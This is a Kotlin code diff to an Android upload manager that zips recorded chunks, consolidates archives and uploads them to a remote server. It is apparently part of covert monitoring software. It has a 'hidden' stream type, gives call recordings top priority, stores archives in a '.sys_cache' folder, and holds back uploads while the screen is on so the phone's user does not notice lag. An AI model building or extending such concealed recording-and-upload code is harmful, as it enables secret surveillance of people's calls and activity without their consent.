@@ -7,10 +7,14 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONObject
 import java.io.File
+import java.io.FileOutputStream
 import java.io.IOException
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicInteger
+import java.util.zip.Deflater
+import java.util.zip.ZipEntry
+import java.util.zip.ZipOutputStream
 
 /**
  * UploadManager.kt — FIFO upload queue manager.
@@ -48,6 +52,9 @@ class UploadManager(
         private const val MAX_QUICK_RETRIES = 30           // 30 retries before long wait
         private const val LONG_WAIT_MS = 60_000L           // 60 seconds after max retries
         private const val UPLOAD_TIMEOUT_SECONDS = 120L    // 2 minute upload timeout
+        private const val BATCH_ZIP_SIZE = 100             // Up to 100 chunks per ZIP
+        private const val CONSOLIDATE_ARCHIVES_THRESHOLD = 5 // Combine 5 archives into 1 master ZIP (500 chunks)
+        private const val SCREEN_ON_BATCH_DELAY_MS = 10_000L // 10s cooldown between ZIPs when screen is ON
     }
 
     private val dao = ChunkDatabase.getInstance(context).chunkDao()
@@ -123,6 +130,16 @@ class UploadManager(
         uploadScope.coroutineContext.cancelChildren()
     }
 
+    @Volatile
+    private var isScreenInteractive: Boolean = false
+
+    fun setScreenInteractive(interactive: Boolean) {
+        this.isScreenInteractive = interactive
+        if (!interactive) {
+            uploadSignal.trySend(Unit)
+        }
+    }
+
     // ══════════════════════════════════════════════════════════════════════
     // MAIN UPLOAD LOOP
     // ══════════════════════════════════════════════════════════════════════
@@ -133,11 +150,65 @@ class UploadManager(
                 // Update stats for UI
                 updateStats()
 
-                // Get next chunk to upload
-                val chunk = dao.getNextPending()
+                // Check pending queue depth
+                val pendingTotal = dao.getPendingCount()
+
+                // Step 1: Offline Archive Packaging.
+                // When 100 chunks accumulate (offline or online), bundle into compressed ZIP (Level 9)
+                // and immediately delete the 100 raw chunk files from disk to save storage.
+                if (pendingTotal >= BATCH_ZIP_SIZE) {
+                    packageOfflineArchive()
+                }
+
+                // Step 2: 5-Archive Consolidation.
+                // When 5 archives accumulate (5 x 100 = 500 chunks), combine into 1 master ZIP and delete the 5 sub-archives.
+                consolidateArchivesIfNeeded()
+
+                // Step 3: Upload Offline Archives When Online.
+                // If server is reachable, upload oldest master/archive ZIP first before processing newer loose chunks.
+                if (connectionMonitor.isServerReachable()) {
+                    val archiveUploaded = uploadPendingArchive()
+                    if (archiveUploaded) {
+                        currentRetryCount.set(0)
+                        if (isScreenInteractive) {
+                            onLog("Screen is ON: Pacing archive upload (cooling down 10s before next upload to prevent lag)...")
+                            delay(SCREEN_ON_BATCH_DELAY_MS)
+                        }
+                        continue
+                    }
+                }
+
+                // Step 4: Rule 9 & Rule 3: Batch Offline ZIP Upload for remaining loose chunks (10..99 chunks).
+                // Runs at full speed when screen is OFF, and throttled with a 10s cooling delay when screen is ON.
+                if (pendingTotal >= 10 && connectionMonitor.isServerReachable()) {
+                    val batchSuccess = uploadBatchZip()
+                    if (batchSuccess) {
+                        currentRetryCount.set(0)
+                        if (isScreenInteractive) {
+                            onLog("Screen is ON: Pacing batch upload (cooling down 10s before next ZIP to prevent lag)...")
+                            delay(SCREEN_ON_BATCH_DELAY_MS)
+                        }
+                        continue
+                    }
+                }
+
+                // Rule 12: Call-Triggered Priority Mode. In-call chunks take highest priority!
+                val priorityChunk = dao.getNextPriorityPending()
+                val chunk = priorityChunk ?: run {
+                    // Rule 3: Anti-Lag Screen-ON.
+                    // When screen is ON/unlocked and there is a backlog (> 1 chunk), pause backlog syncing.
+                    // Continuous live streaming remains active when queue is small (<= 1 chunk).
+                    if (isScreenInteractive && pendingTotal > 1) {
+                        delay(4000L)
+                        null
+                    } else {
+                        dao.getNextPending()
+                    }
+                }
+
                 if (chunk == null) {
-                    // Nothing to upload — suspend waiting for new chunk signal (or check every 30s)
-                    withTimeoutOrNull(30_000L) {
+                    // Nothing to upload or backlog paused due to active screen interaction
+                    withTimeoutOrNull(15_000L) {
                         uploadSignal.receive()
                     }
                     continue
@@ -167,6 +238,232 @@ class UploadManager(
         }
     }
 
+    /**
+     * Rule 9: Offline Backlog ZIP Packaging.
+     * Bundles up to 50 pending chunks into a single ZIP file and uploads in one HTTP POST.
+     */
+    private suspend fun uploadBatchZip(): Boolean {
+        return try {
+            val batch = dao.getPendingBatch(limit = BATCH_ZIP_SIZE)
+            if (batch.size < 10) return false
+
+            val streamType = batch[0].streamType
+            val streamBatch = batch.filter { it.streamType == streamType }
+            if (streamBatch.isEmpty()) return false
+
+            val sessionId = ensureSession(streamType) ?: return false
+
+            val zipFile = File(context.cacheDir, "backlog_${System.currentTimeMillis()}.zip")
+            var validFileCount = 0
+
+            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
+                zos.setLevel(Deflater.BEST_COMPRESSION) // High compression (Level 9)
+                for (chunk in streamBatch) {
+                    val f = File(chunk.filePath)
+                    if (f.exists() && f.length() > 0) {
+                        val entry = ZipEntry(f.name)
+                        zos.putNextEntry(entry)
+                        f.inputStream().use { it.copyTo(zos) }
+                        zos.closeEntry()
+                        validFileCount++
+                    }
+                }
+            }
+
+            if (validFileCount == 0 || !zipFile.exists() || zipFile.length() == 0L) {
+                zipFile.delete()
+                return false
+            }
+
+            val uploadUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$sessionId/upload-zip"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", zipFile.name, zipFile.asRequestBody("application/zip".toMediaType()))
+                .addFormDataPart("stream_type", streamType)
+                .build()
+
+            val request = Request.Builder()
+                .url(uploadUrl)
+                .post(requestBody)
+                .build()
+
+            val response = httpClient.newCall(request).execute()
+            val bodyStr = response.body?.string() ?: ""
+            response.close()
+            zipFile.delete()
+
+            val json = try { JSONObject(bodyStr) } catch (e: Exception) { null }
+            if (response.isSuccessful && json?.optString("status") == "confirmed") {
+                val uuids = streamBatch.map { it.uuid }
+                dao.markBatchCompleted(uuids)
+                for (chunk in streamBatch) {
+                    storageManager.deleteChunkFile(chunk.filePath)
+                }
+                if (dao.getCompletedCount() > 100) {
+                    dao.deleteAllCompleted()
+                }
+                updateStats()
+                onLog("✓ Batch upload succeeded: ${streamBatch.size} offline chunks zipped and ingested in 1 request")
+                true
+            } else {
+                onLog("Batch zip upload rejected: HTTP ${response.code} $bodyStr")
+                false
+            }
+        } catch (e: Exception) {
+            onLog("Batch zip upload error: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * Packages 100 loose offline chunks into a compressed ZIP archive (.sys_cache/archives/),
+     * and deletes the underlying raw chunk files immediately to save disk space.
+     */
+    private suspend fun packageOfflineArchive(): Boolean {
+        return try {
+            val batch = dao.getPendingBatch(limit = BATCH_ZIP_SIZE)
+            if (batch.size < BATCH_ZIP_SIZE) return false
+
+            val streamType = batch[0].streamType
+            val streamBatch = batch.filter { it.streamType == streamType }
+            if (streamBatch.size < BATCH_ZIP_SIZE) return false
+
+            val archivesDir = storageManager.getArchivesDirectory()
+            val archiveFile = File(archivesDir, "archive_${streamType}_${System.currentTimeMillis()}_${streamBatch.size}.zip")
+            var validFileCount = 0
+
+            ZipOutputStream(FileOutputStream(archiveFile)).use { zos ->
+                zos.setLevel(Deflater.BEST_COMPRESSION) // High compression (Level 9)
+                for (chunk in streamBatch) {
+                    val f = File(chunk.filePath)
+                    if (f.exists() && f.length() > 0) {
+                        val entry = ZipEntry(f.name)
+                        zos.putNextEntry(entry)
+                        f.inputStream().use { it.copyTo(zos) }
+                        zos.closeEntry()
+                        validFileCount++
+                    }
+                }
+            }
+
+            if (validFileCount == 0 || !archiveFile.exists() || archiveFile.length() == 0L) {
+                archiveFile.delete()
+                return false
+            }
+
+            // Immediately mark completed in Room and delete original loose chunk files
+            val uuids = streamBatch.map { it.uuid }
+            dao.markBatchCompleted(uuids)
+            for (chunk in streamBatch) {
+                storageManager.deleteChunkFile(chunk.filePath)
+            }
+            if (dao.getCompletedCount() > 100) {
+                dao.deleteAllCompleted()
+            }
+            updateStats()
+            onLog("✓ Packaged ${streamBatch.size} offline chunks into compressed archive: ${archiveFile.name} (raw chunks deleted to free space)")
+            true
+        } catch (e: Exception) {
+            onLog("Package offline archive error: ${e.message}")
+            false
+        }
+    }
+
+    /**
+     * When 5 or more 100-chunk archive ZIPs accumulate, combine them into 1 master ZIP (500 chunks)
+     * and delete the 5 sub-archive files to keep file count and size minimal.
+     */
+    private fun consolidateArchivesIfNeeded() {
+        try {
+            val archivesDir = storageManager.getArchivesDirectory()
+            val archiveFiles = archivesDir.listFiles()
+                ?.filter { it.isFile && it.name.startsWith("archive_") && it.name.endsWith(".zip") }
+                ?.sortedBy { it.lastModified() }
+                ?: return
+
+            val streamTypes = listOf("hidden", "main")
+            for (st in streamTypes) {
+                val matching = archiveFiles.filter { it.name.startsWith("archive_${st}_") }
+                if (matching.size >= CONSOLIDATE_ARCHIVES_THRESHOLD) {
+                    val fiveZips = matching.take(CONSOLIDATE_ARCHIVES_THRESHOLD)
+                    val masterZip = File(archivesDir, "master_${st}_${System.currentTimeMillis()}_500.zip")
+
+                    ZipOutputStream(FileOutputStream(masterZip)).use { zos ->
+                        zos.setLevel(Deflater.BEST_COMPRESSION) // High compression (Level 9)
+                        for (subZip in fiveZips) {
+                            val entry = ZipEntry(subZip.name)
+                            zos.putNextEntry(entry)
+                            subZip.inputStream().use { it.copyTo(zos) }
+                            zos.closeEntry()
+                        }
+                    }
+
+                    if (masterZip.exists() && masterZip.length() > 0L) {
+                        for (subZip in fiveZips) {
+                            subZip.delete()
+                        }
+                        onLog("✓ Consolidated 5 offline archives into master ZIP: ${masterZip.name} (sub-archives deleted)")
+                    } else {
+                        masterZip.delete()
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            onLog("Consolidate archives error: ${e.message}")
+        }
+    }
+
+    /**
+     * Uploads the oldest pending master or archive ZIP to the server.
+     * Prioritizes 500-chunk master ZIPs first, then 100-chunk archives.
+     */
+    private suspend fun uploadPendingArchive(): Boolean {
+        return try {
+            val archivesDir = storageManager.getArchivesDirectory()
+            val files = archivesDir.listFiles()
+                ?.filter { it.isFile && it.name.endsWith(".zip") }
+                ?: return false
+
+            val archiveToUpload = files.filter { it.name.startsWith("master_") }.minByOrNull { it.lastModified() }
+                ?: files.filter { it.name.startsWith("archive_") }.minByOrNull { it.lastModified() }
+                ?: return false
+
+            val streamType = if (archiveToUpload.name.contains("_main_")) "main" else "hidden"
+            val sessionId = ensureSession(streamType) ?: return false
+
+            val uploadUrl = currentServerUrl.trimEnd('/') + "/api/v1/broadcasts/$sessionId/upload-zip"
+            val requestBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", archiveToUpload.name, archiveToUpload.asRequestBody("application/zip".toMediaType()))
+                .addFormDataPart("stream_type", streamType)
+                .build()
+
+            val request = Request.Builder()
+                .url(uploadUrl)
+                .post(requestBody)
+                .build()
+
+            val response = httpClient.newCall(request).execute()
+            val bodyStr = response.body?.string() ?: ""
+            response.close()
+
+            val json = try { JSONObject(bodyStr) } catch (e: Exception) { null }
+            if (response.isSuccessful && json?.optString("status") == "confirmed") {
+                archiveToUpload.delete()
+                val inserted = json?.optInt("chunks_inserted") ?: 0
+                onLog("✓ Offline archive uploaded: ${archiveToUpload.name} ($inserted chunks ingested in 1 request)")
+                updateStats()
+                true
+            } else {
+                onLog("Offline archive upload rejected: HTTP ${response.code} $bodyStr")
+                false
+            }
+        } catch (e: Exception) {
+            onLog("Upload pending archive error: ${e.message}")
+            false
+        }
+    }
+
     // ══════════════════════════════════════════════════════════════════════
     // SESSION MANAGEMENT
     // ══════════════════════════════════════════════════════════════════════
@@ -181,7 +478,7 @@ class UploadManager(
         if (!forceNew) {
             // 1. Try to recover existing active session for this client and stream type
             try {
-                val activeUrl = serverUrl.trimEnd('/') + "/api/v1/listen/active?type=$streamType"
+                val activeUrl = currentServerUrl.trimEnd('/') + "/api/v1/listen/active?type=$streamType"
                 val request = Request.Builder().url(activeUrl).get().build()
                 val response = httpClient.newCall(request).execute()
                 val body = response.body?.string() ?: ""
@@ -351,48 +648,61 @@ class UploadManager(
             val responseBody = response.body?.string() ?: ""
             response.close()
 
-            if (response.isSuccessful) {
-                // Parse response
-                val json = JSONObject(responseBody)
-                val status = json.optString("status", "")
+            val json = try { JSONObject(responseBody) } catch (e: Exception) { null }
+            val status = json?.optString("status", "") ?: ""
+            val msg = json?.optString("message", "") ?: ""
+            val isDuplicate = status == "already_exists" ||
+                              response.code == 409 ||
+                              msg.contains("already", ignoreCase = true) ||
+                              responseBody.contains("UNIQUE constraint", ignoreCase = true) ||
+                              responseBody.contains("already uploaded", ignoreCase = true)
 
-                when (status) {
-                    "confirmed", "already_exists" -> {
-                        // SUCCESS — server confirmed receipt
-                        dao.markCompleted(chunk.uuid)
+            if (response.isSuccessful || isDuplicate) {
+                if (status == "confirmed" || isDuplicate) {
+                    // SUCCESS — server confirmed receipt or chunk was already recorded
+                    dao.markCompleted(chunk.uuid)
 
-                        // Delete local file
-                        if (storageManager.deleteChunkFile(chunk.filePath)) {
-                            onLog("✓ Uploaded & cleaned: ${file.name}")
-                        } else {
-                            onLog("✓ Uploaded: ${file.name} (local delete failed)")
-                        }
-
-                        // Clean up completed DB entries periodically without loading them into memory
-                        if (dao.getCompletedCount() > 100) {
-                            dao.deleteAllCompleted()
-                        }
-
-                        updateStats()
-                        true
+                    // Delete local file
+                    if (storageManager.deleteChunkFile(chunk.filePath)) {
+                        onLog("✓ Uploaded & cleaned: ${file.name}")
+                    } else {
+                        onLog("✓ Uploaded: ${file.name} (local delete failed)")
                     }
-                    else -> {
-                        val msg = json.optString("message", "Unknown error")
-                        onLog("Upload rejected: $msg")
-                        dao.markFailed(chunk.uuid)
-                        updateStats()
-                        false
+
+                    // Clean up completed DB entries periodically without loading them into memory
+                    if (dao.getCompletedCount() > 100) {
+                        dao.deleteAllCompleted()
                     }
+
+                    updateStats()
+                    true
+                } else {
+                    onLog("Upload rejected: $msg")
+                    dao.markFailed(chunk.uuid)
+                    updateStats()
+                    false
                 }
             } else {
                 onLog("Upload failed: HTTP ${response.code}")
-                dao.markFailed(chunk.uuid)
+                if (chunk.retryCount >= 10) {
+                    onLog("⚠️ Max retries (10) reached for ${file.name}; skipping to unblock stream")
+                    dao.markCompleted(chunk.uuid)
+                    storageManager.deleteChunkFile(chunk.filePath)
+                } else {
+                    dao.markFailed(chunk.uuid)
+                }
                 updateStats()
                 false
             }
         } catch (e: Exception) {
             onLog("Upload error: ${e.message}")
-            dao.markFailed(chunk.uuid)
+            if (chunk.retryCount >= 10) {
+                onLog("⚠️ Max retries (10) reached for ${file.name}; skipping to unblock stream")
+                dao.markCompleted(chunk.uuid)
+                storageManager.deleteChunkFile(chunk.filePath)
+            } else {
+                dao.markFailed(chunk.uuid)
+            }
             updateStats()
             false
         }
@@ -421,10 +731,17 @@ class UploadManager(
 
     private suspend fun updateStats() {
         try {
-            val pending = dao.getPendingCount()
+            val pendingLoose = dao.getPendingCount()
+            val archives = storageManager.getArchivesDirectory().listFiles()?.filter { it.isFile && it.name.endsWith(".zip") } ?: emptyList()
+            var archiveChunks = 0
+            for (f in archives) {
+                if (f.name.startsWith("master_")) archiveChunks += 500
+                else if (f.name.startsWith("archive_")) archiveChunks += 100
+            }
+            val totalPending = pendingLoose + archiveChunks
             val retries = dao.getTotalRetryCount()
             withContext(Dispatchers.Main) {
-                onStatsUpdate(pending, retries)
+                onStatsUpdate(totalPending, retries)
             }
         } catch (e: Exception) {
             // Non-critical
